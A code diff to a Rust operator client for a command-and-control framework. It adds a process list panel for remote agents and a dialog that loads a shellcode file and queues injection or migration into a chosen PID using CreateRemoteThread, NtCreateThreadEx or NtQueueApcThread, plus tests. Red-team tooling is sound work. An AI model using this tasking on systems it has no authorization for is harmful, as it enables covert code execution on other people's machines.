@@ -19,8 +19,9 @@ use red_cell_common::operator::{
 };
 use rfd::FileDialog;
 use transport::{
-    AgentConsoleEntry, AgentConsoleEntryKind, AgentFileBrowserState, AppState, ClientTransport,
-    ConnectionStatus, FileBrowserEntry, LootItem, LootKind, SharedAppState,
+    AgentConsoleEntry, AgentConsoleEntryKind, AgentFileBrowserState, AgentProcessListState,
+    AppState, ClientTransport, ConnectionStatus, FileBrowserEntry, LootItem, LootKind,
+    ProcessEntry, SharedAppState,
 };
 
 const WINDOW_TITLE: &str = "Red Cell Client";
@@ -128,6 +129,68 @@ struct AgentFileBrowserUiState {
     status_message: Option<String>,
 }
 
+#[derive(Debug, Default)]
+struct AgentProcessPanelState {
+    filter: String,
+    status_message: Option<String>,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+enum InjectionTargetAction {
+    #[default]
+    Inject,
+    Migrate,
+}
+
+impl InjectionTargetAction {
+    fn label(self) -> &'static str {
+        match self {
+            Self::Inject => "Inject",
+            Self::Migrate => "Migrate",
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+enum InjectionTechnique {
+    #[default]
+    Default,
+    CreateRemoteThread,
+    NtCreateThreadEx,
+    NtQueueApcThread,
+}
+
+impl InjectionTechnique {
+    const ALL: [(Self, &'static str); 4] = [
+        (Self::Default, "Default"),
+        (Self::CreateRemoteThread, "CreateRemoteThread"),
+        (Self::NtCreateThreadEx, "NtCreateThreadEx"),
+        (Self::NtQueueApcThread, "NtQueueApcThread"),
+    ];
+
+    fn as_wire_value(self) -> &'static str {
+        match self {
+            Self::Default => "default",
+            Self::CreateRemoteThread => "createremotethread",
+            Self::NtCreateThreadEx => "ntcreatethreadex",
+            Self::NtQueueApcThread => "ntqueueapcthread",
+        }
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct ProcessInjectionDialogState {
+    agent_id: String,
+    pid: u32,
+    process_name: String,
+    arch: String,
+    action: InjectionTargetAction,
+    technique: InjectionTechnique,
+    shellcode_path: String,
+    arguments: String,
+    status_message: Option<String>,
+}
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
 enum ConsoleLayoutMode {
     #[default]
@@ -149,7 +212,9 @@ struct SessionPanelState {
     console_layout: ConsoleLayoutMode,
     console_state: BTreeMap<String, AgentConsoleState>,
     file_browser_state: BTreeMap<String, AgentFileBrowserUiState>,
+    process_state: BTreeMap<String, AgentProcessPanelState>,
     note_editor: Option<NoteEditorState>,
+    process_injection: Option<ProcessInjectionDialogState>,
     pending_messages: Vec<OperatorMessage>,
     status_message: Option<String>,
     loot_type_filter: LootTypeFilter,
@@ -204,6 +269,10 @@ impl SessionPanelState {
 
     fn file_browser_state_mut(&mut self, agent_id: &str) -> &mut AgentFileBrowserUiState {
         self.file_browser_state.entry(agent_id.to_owned()).or_default()
+    }
+
+    fn process_state_mut(&mut self, agent_id: &str) -> &mut AgentProcessPanelState {
+        self.process_state.entry(agent_id.to_owned()).or_default()
     }
 }
 
@@ -749,6 +818,7 @@ impl ClientApp {
         });
 
         self.render_note_editor(ctx, app_state);
+        self.render_process_injection_dialog(ctx);
         self.flush_pending_messages();
     }
 
@@ -913,6 +983,7 @@ impl ClientApp {
         let agent = state.agents.iter().find(|agent| agent.name_id == agent_id);
         let entries = state.agent_consoles.get(agent_id).map(Vec::as_slice).unwrap_or(&[]);
         let browser = state.file_browsers.get(agent_id);
+        let process_list = state.process_lists.get(agent_id);
         let status_message = self
             .session_panel
             .console_state
@@ -974,6 +1045,11 @@ impl ClientApp {
 
                 ui.add_space(8.0);
                 self.render_console_input(ui, agent_id);
+
+                ui.add_space(12.0);
+                ui.separator();
+                ui.add_space(8.0);
+                self.render_process_panel(ui, agent, agent_id, process_list);
             });
     }
 
@@ -1266,6 +1342,242 @@ impl ClientApp {
         }
     }
 
+    fn render_process_panel(
+        &mut self,
+        ui: &mut egui::Ui,
+        agent: Option<&transport::AgentSummary>,
+        agent_id: &str,
+        process_list: Option<&AgentProcessListState>,
+    ) {
+        ui.heading("Process List");
+        ui.separator();
+
+        let current_pid = agent.and_then(|entry| entry.process_pid.trim().parse::<u32>().ok());
+        let process_status = self
+            .session_panel
+            .process_state
+            .get(agent_id)
+            .and_then(|state| state.status_message.clone())
+            .or_else(|| process_list.and_then(|state| state.status_message.clone()));
+
+        ui.horizontal_wrapped(|ui| {
+            ui.label("Filter");
+            let filter = &mut self.session_panel.process_state_mut(agent_id).filter;
+            ui.add(
+                egui::TextEdit::singleline(filter)
+                    .desired_width(180.0)
+                    .hint_text("Search name or PID"),
+            );
+
+            if ui.button("Refresh").clicked() {
+                self.queue_process_refresh(agent_id);
+            }
+
+            if let Some(updated_at) = process_list.and_then(|state| state.updated_at.as_deref()) {
+                ui.separator();
+                ui.label(RichText::new(format!("Updated {updated_at}")).weak());
+            }
+
+            if let Some(pid) = current_pid {
+                ui.separator();
+                ui.label(RichText::new(format!("Agent PID {pid}")).weak());
+            }
+        });
+
+        if let Some(message) = process_status {
+            ui.add_space(4.0);
+            ui.label(RichText::new(message).weak());
+        }
+        ui.add_space(6.0);
+
+        let Some(process_list) = process_list else {
+            ui.label("No process list has been received for this agent yet.");
+            return;
+        };
+
+        let filter = self
+            .session_panel
+            .process_state
+            .get(agent_id)
+            .map(|state| state.filter.as_str())
+            .unwrap_or_default();
+        let rows = filtered_process_rows(&process_list.rows, filter);
+        if rows.is_empty() {
+            ui.label("No processes match the current filter.");
+            return;
+        }
+
+        egui::Grid::new(("process-table-header", agent_id))
+            .num_columns(7)
+            .spacing([10.0, 6.0])
+            .show(ui, |ui| {
+                ui.strong("PID");
+                ui.strong("PPID");
+                ui.strong("Name");
+                ui.strong("Arch");
+                ui.strong("User");
+                ui.strong("Session");
+                ui.strong("Actions");
+                ui.end_row();
+            });
+        ui.separator();
+
+        egui::ScrollArea::vertical().id_salt(("process-table", agent_id)).max_height(240.0).show(
+            ui,
+            |ui| {
+                for row in rows {
+                    let highlight = current_pid == Some(row.pid);
+                    egui::Frame::default()
+                        .fill(if highlight {
+                            Color32::from_rgba_unmultiplied(110, 199, 141, 40)
+                        } else {
+                            Color32::TRANSPARENT
+                        })
+                        .inner_margin(egui::Margin::symmetric(6, 4))
+                        .show(ui, |ui| {
+                            egui::Grid::new(("process-row", agent_id, row.pid))
+                                .num_columns(7)
+                                .spacing([10.0, 4.0])
+                                .show(ui, |ui| {
+                                    ui.monospace(row.pid.to_string());
+                                    ui.monospace(row.ppid.to_string());
+                                    ui.label(&row.name);
+                                    ui.label(&row.arch);
+                                    ui.label(blank_if_empty(&row.user, "unknown"));
+                                    ui.label(row.session.to_string());
+                                    ui.horizontal_wrapped(|ui| {
+                                        if ui.small_button("Kill").clicked() {
+                                            self.queue_process_kill(agent_id, row.pid);
+                                        }
+                                        if ui.small_button("Inject").clicked() {
+                                            self.open_process_injection_dialog(
+                                                agent_id,
+                                                row,
+                                                InjectionTargetAction::Inject,
+                                            );
+                                        }
+                                        if ui.small_button("Migrate").clicked() {
+                                            self.open_process_injection_dialog(
+                                                agent_id,
+                                                row,
+                                                InjectionTargetAction::Migrate,
+                                            );
+                                        }
+                                    });
+                                    ui.end_row();
+                                });
+                        });
+                    ui.add_space(2.0);
+                }
+            },
+        );
+    }
+
+    fn open_process_injection_dialog(
+        &mut self,
+        agent_id: &str,
+        row: &ProcessEntry,
+        action: InjectionTargetAction,
+    ) {
+        self.session_panel.process_injection = Some(ProcessInjectionDialogState {
+            agent_id: agent_id.to_owned(),
+            pid: row.pid,
+            process_name: row.name.clone(),
+            arch: row.arch.clone(),
+            action,
+            technique: InjectionTechnique::Default,
+            shellcode_path: String::new(),
+            arguments: String::new(),
+            status_message: None,
+        });
+    }
+
+    fn render_process_injection_dialog(&mut self, ctx: &egui::Context) {
+        let Some(dialog) = &mut self.session_panel.process_injection else {
+            return;
+        };
+
+        let mut keep_open = true;
+        let mut queue_task = false;
+        let mut cancel = false;
+
+        egui::Window::new(format!("{} {}", dialog.action.label(), dialog.process_name))
+            .collapsible(false)
+            .resizable(true)
+            .default_size([480.0, 220.0])
+            .open(&mut keep_open)
+            .show(ctx, |ui| {
+                ui.label(format!(
+                    "{} into PID {} ({}, {})",
+                    dialog.action.label(),
+                    dialog.pid,
+                    dialog.process_name,
+                    dialog.arch
+                ));
+                ui.add_space(8.0);
+                ui.horizontal(|ui| {
+                    ui.label("Technique");
+                    egui::ComboBox::from_id_salt((
+                        "inject-technique",
+                        dialog.agent_id.as_str(),
+                        dialog.pid,
+                    ))
+                    .selected_text(match dialog.technique {
+                        InjectionTechnique::Default => "Default",
+                        InjectionTechnique::CreateRemoteThread => "CreateRemoteThread",
+                        InjectionTechnique::NtCreateThreadEx => "NtCreateThreadEx",
+                        InjectionTechnique::NtQueueApcThread => "NtQueueApcThread",
+                    })
+                    .show_ui(ui, |ui| {
+                        for (value, label) in InjectionTechnique::ALL {
+                            ui.selectable_value(&mut dialog.technique, value, label);
+                        }
+                    });
+                });
+                ui.add_space(6.0);
+                ui.horizontal(|ui| {
+                    ui.label("Shellcode");
+                    ui.add(
+                        egui::TextEdit::singleline(&mut dialog.shellcode_path)
+                            .desired_width(260.0)
+                            .hint_text("/path/to/payload.bin"),
+                    );
+                    if ui.button("Browse").clicked() {
+                        if let Some(path) = FileDialog::new().pick_file() {
+                            dialog.shellcode_path = path.display().to_string();
+                        }
+                    }
+                });
+                ui.add_space(6.0);
+                ui.label("Arguments");
+                ui.add(
+                    egui::TextEdit::singleline(&mut dialog.arguments)
+                        .desired_width(f32::INFINITY)
+                        .hint_text("Optional arguments passed to the payload"),
+                );
+                if let Some(message) = &dialog.status_message {
+                    ui.add_space(6.0);
+                    ui.label(RichText::new(message).weak());
+                }
+                ui.add_space(8.0);
+                ui.horizontal(|ui| {
+                    if ui.button(dialog.action.label()).clicked() {
+                        queue_task = true;
+                    }
+                    if ui.button("Cancel").clicked() {
+                        cancel = true;
+                    }
+                });
+            });
+
+        if queue_task {
+            self.submit_process_injection();
+            ctx.request_repaint();
+        } else if cancel || !keep_open {
+            self.session_panel.process_injection = None;
+        }
+    }
+
     fn render_note_editor(&mut self, ctx: &egui::Context, app_state: &SharedAppState) {
         let Some(editor) = &mut self.session_panel.note_editor else {
             return;
@@ -1352,6 +1664,64 @@ impl ClientApp {
         path: &str,
     ) -> Option<OperatorMessage> {
         Some(build_file_browser_list_task(agent_id, path, &self.current_operator_username()))
+    }
+
+    fn queue_process_refresh(&mut self, agent_id: &str) {
+        let message = build_process_list_task(agent_id, &self.current_operator_username());
+        self.session_panel.process_state_mut(agent_id).status_message =
+            Some("Queued `ps`.".to_owned());
+        self.session_panel.pending_messages.push(message);
+    }
+
+    fn queue_process_kill(&mut self, agent_id: &str, pid: u32) {
+        let message = build_process_kill_task(agent_id, pid, &self.current_operator_username());
+        self.session_panel.process_state_mut(agent_id).status_message =
+            Some(format!("Queued process kill for PID {pid}."));
+        self.session_panel.pending_messages.push(message);
+    }
+
+    fn submit_process_injection(&mut self) {
+        let Some(dialog) = self.session_panel.process_injection.clone() else {
+            return;
+        };
+
+        let shellcode_path = dialog.shellcode_path.trim();
+        if shellcode_path.is_empty() {
+            if let Some(dialog_state) = self.session_panel.process_injection.as_mut() {
+                dialog_state.status_message = Some("Select a shellcode file first.".to_owned());
+            }
+            return;
+        }
+
+        match std::fs::read(shellcode_path) {
+            Ok(binary) => {
+                let operator = self.current_operator_username();
+                let message = build_process_injection_task(
+                    &dialog.agent_id,
+                    dialog.pid,
+                    &dialog.arch,
+                    dialog.technique,
+                    &binary,
+                    &dialog.arguments,
+                    dialog.action,
+                    &operator,
+                );
+                self.session_panel.process_state_mut(&dialog.agent_id).status_message =
+                    Some(format!(
+                        "Queued {} for PID {}.",
+                        dialog.action.label().to_ascii_lowercase(),
+                        dialog.pid
+                    ));
+                self.session_panel.pending_messages.push(message);
+                self.session_panel.process_injection = None;
+            }
+            Err(error) => {
+                if let Some(dialog_state) = self.session_panel.process_injection.as_mut() {
+                    dialog_state.status_message =
+                        Some(format!("Failed to read shellcode file: {error}"));
+                }
+            }
+        }
     }
 
     fn queue_file_browser_pwd(&mut self, agent_id: &str) {
@@ -1512,6 +1882,81 @@ fn build_kill_task(agent_id: &str, operator: &str) -> OperatorMessage {
             command_id: u32::from(DemonCommand::CommandExit).to_string(),
             command_line: "kill".to_owned(),
             command: Some("kill".to_owned()),
+            ..AgentTaskInfo::default()
+        },
+    )
+}
+
+fn build_process_list_task(agent_id: &str, operator: &str) -> OperatorMessage {
+    build_agent_task(
+        operator,
+        AgentTaskInfo {
+            demon_id: agent_id.to_owned(),
+            task_id: format!("{:08X}", next_task_id()),
+            command_id: u32::from(DemonCommand::CommandProcList).to_string(),
+            command_line: "ps".to_owned(),
+            command: Some("ps".to_owned()),
+            extra: BTreeMap::from([(
+                "FromProcessManager".to_owned(),
+                serde_json::Value::Bool(true),
+            )]),
+            ..AgentTaskInfo::default()
+        },
+    )
+}
+
+fn build_process_kill_task(agent_id: &str, pid: u32, operator: &str) -> OperatorMessage {
+    build_agent_task(operator, process_kill_info(agent_id, pid))
+}
+
+fn build_process_injection_task(
+    agent_id: &str,
+    pid: u32,
+    arch: &str,
+    technique: InjectionTechnique,
+    binary: &[u8],
+    arguments: &str,
+    action: InjectionTargetAction,
+    operator: &str,
+) -> OperatorMessage {
+    let command_line = format!(
+        "{} pid={} arch={} {}",
+        action.label().to_ascii_lowercase(),
+        pid,
+        normalized_process_arch(arch),
+        human_size(binary.len() as u64)
+    );
+    build_agent_task(
+        operator,
+        AgentTaskInfo {
+            demon_id: agent_id.to_owned(),
+            task_id: format!("{:08X}", next_task_id()),
+            command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
+            command_line,
+            command: Some("shellcode".to_owned()),
+            sub_command: Some("inject".to_owned()),
+            extra: BTreeMap::from([
+                ("Way".to_owned(), serde_json::Value::String("Inject".to_owned())),
+                (
+                    "Technique".to_owned(),
+                    serde_json::Value::String(technique.as_wire_value().to_owned()),
+                ),
+                ("Arch".to_owned(), serde_json::Value::String(normalized_process_arch(arch))),
+                (
+                    "Binary".to_owned(),
+                    serde_json::Value::String(
+                        base64::engine::general_purpose::STANDARD.encode(binary),
+                    ),
+                ),
+                ("PID".to_owned(), serde_json::Value::String(pid.to_string())),
+                ("Action".to_owned(), serde_json::Value::String(action.label().to_owned())),
+                (
+                    "Arguments".to_owned(),
+                    serde_json::Value::String(
+                        base64::engine::general_purpose::STANDARD.encode(arguments.as_bytes()),
+                    ),
+                ),
+            ]),
             ..AgentTaskInfo::default()
         },
     )
@@ -1783,25 +2228,24 @@ fn process_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, Str
             if parts.next().is_some() {
                 return Err("Usage: proc kill <pid>".to_owned());
             }
-            if pid.parse::<u32>().is_err() {
-                return Err(format!("Invalid PID `{pid}`."));
-            }
-            Ok(AgentTaskInfo {
-                demon_id: agent_id.to_owned(),
-                task_id: format!("{:08X}", next_task_id()),
-                command_id: u32::from(DemonCommand::CommandProc).to_string(),
-                command_line: command_line.to_owned(),
-                command: Some("proc".to_owned()),
-                sub_command: Some("kill".to_owned()),
-                arguments: Some(pid.to_owned()),
-                extra: BTreeMap::from([(
-                    "Args".to_owned(),
-                    serde_json::Value::String(pid.to_owned()),
-                )]),
-                ..AgentTaskInfo::default()
-            })
+            let pid = pid.parse::<u32>().map_err(|_| format!("Invalid PID `{pid}`."))?;
+            Ok(process_kill_info(agent_id, pid))
         }
         _ => Err("Usage: proc kill <pid>".to_owned()),
+    }
+}
+
+fn process_kill_info(agent_id: &str, pid: u32) -> AgentTaskInfo {
+    AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandProc).to_string(),
+        command_line: format!("proc kill {pid}"),
+        command: Some("proc".to_owned()),
+        sub_command: Some("kill".to_owned()),
+        arguments: Some(pid.to_string()),
+        extra: BTreeMap::from([("Args".to_owned(), serde_json::Value::String(pid.to_string()))]),
+        ..AgentTaskInfo::default()
     }
 }
 
@@ -1977,6 +2421,27 @@ fn agent_matches_filter(agent: &transport::AgentSummary, filter: &str) -> bool {
     ]
     .into_iter()
     .any(|field| field.to_ascii_lowercase().contains(&needle))
+}
+
+fn filtered_process_rows<'a>(rows: &'a [ProcessEntry], filter: &str) -> Vec<&'a ProcessEntry> {
+    let trimmed = filter.trim();
+    if trimmed.is_empty() {
+        return rows.iter().collect();
+    }
+
+    let needle = trimmed.to_ascii_lowercase();
+    rows.iter()
+        .filter(|row| {
+            row.name.to_ascii_lowercase().contains(&needle) || row.pid.to_string().contains(&needle)
+        })
+        .collect()
+}
+
+fn normalized_process_arch(arch: &str) -> String {
+    match arch.trim().to_ascii_lowercase().as_str() {
+        "x86" | "386" | "i386" => "x86".to_owned(),
+        _ => "x64".to_owned(),
+    }
 }
 
 fn sort_agents(agents: &mut [transport::AgentSummary], column: AgentSortColumn, descending: bool) {
@@ -2264,6 +2729,7 @@ mod tests {
         assert!(app_state.operator_info.is_none());
         assert!(app_state.agents.is_empty());
         assert!(app_state.agent_consoles.is_empty());
+        assert!(app_state.process_lists.is_empty());
         assert!(app_state.listeners.is_empty());
         assert!(app_state.loot.is_empty());
         assert!(app_state.chat_messages.is_empty());
@@ -2366,6 +2832,53 @@ mod tests {
     }
 
     #[test]
+    fn build_process_list_task_marks_process_manager_origin() {
+        let OperatorMessage::AgentTask(message) = build_process_list_task("ABCD1234", "operator")
+        else {
+            panic!("expected agent task");
+        };
+
+        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandProcList).to_string());
+        assert_eq!(
+            message.info.extra.get("FromProcessManager"),
+            Some(&serde_json::Value::Bool(true))
+        );
+    }
+
+    #[test]
+    fn build_process_injection_task_encodes_shellcode_payload() {
+        let OperatorMessage::AgentTask(message) = build_process_injection_task(
+            "ABCD1234",
+            4444,
+            "x64",
+            InjectionTechnique::NtCreateThreadEx,
+            &[0x90, 0x90, 0xCC],
+            "--flag",
+            InjectionTargetAction::Inject,
+            "operator",
+        ) else {
+            panic!("expected agent task");
+        };
+
+        assert_eq!(
+            message.info.command_id,
+            u32::from(DemonCommand::CommandInjectShellcode).to_string()
+        );
+        assert_eq!(
+            message.info.extra.get("Technique"),
+            Some(&serde_json::Value::String("ntcreatethreadex".to_owned()))
+        );
+        assert_eq!(
+            message.info.extra.get("Binary"),
+            Some(&serde_json::Value::String("kJDM".to_owned()))
+        );
+        assert_eq!(
+            message.info.extra.get("Arguments"),
+            Some(&serde_json::Value::String("LS1mbGFn".to_owned()))
+        );
+    }
+
+    #[test]
     fn build_note_task_uses_teamserver_note_shape() {
         let OperatorMessage::AgentTask(message) =
             build_note_task("ABCD1234", "triaged", "operator")
@@ -2441,6 +2954,38 @@ mod tests {
         let error = build_console_task("ABCD1234", "proc kill", "operator")
             .expect_err("missing pid should fail");
         assert_eq!(error, "Usage: proc kill <pid>");
+    }
+
+    #[test]
+    fn filtered_process_rows_matches_name_and_pid() {
+        let rows = vec![
+            ProcessEntry {
+                pid: 1010,
+                ppid: 4,
+                name: "explorer.exe".to_owned(),
+                arch: "x64".to_owned(),
+                user: "LAB\\operator".to_owned(),
+                session: 1,
+            },
+            ProcessEntry {
+                pid: 2020,
+                ppid: 4,
+                name: "svchost.exe".to_owned(),
+                arch: "x64".to_owned(),
+                user: "SYSTEM".to_owned(),
+                session: 0,
+            },
+        ];
+
+        assert_eq!(filtered_process_rows(&rows, "explorer").len(), 1);
+        assert_eq!(filtered_process_rows(&rows, "2020").len(), 1);
+        assert_eq!(filtered_process_rows(&rows, "missing").len(), 0);
+    }
+
+    #[test]
+    fn normalized_process_arch_maps_unknown_values_to_x64() {
+        assert_eq!(normalized_process_arch("x86"), "x86");
+        assert_eq!(normalized_process_arch("WOW64"), "x64");
     }
 
     #[test]
